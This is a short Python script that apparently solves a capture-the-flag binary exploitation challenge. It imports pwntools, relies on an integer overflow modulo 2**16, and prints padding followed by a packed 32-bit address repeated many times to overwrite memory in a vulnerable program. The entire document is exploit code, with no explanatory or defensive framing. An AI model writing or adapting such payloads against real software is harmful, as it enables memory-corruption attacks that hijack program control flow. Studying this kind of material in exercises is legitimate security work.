from pwn import *

n = 1 << 16 # Integer overflow = 0 mod 2**16

a = 0xffffd83a + 20
p = 0xffb2fa3c - 0xffb1fb2e

print ((p % 4) * 'A') + ((n / 4) * p32(a))
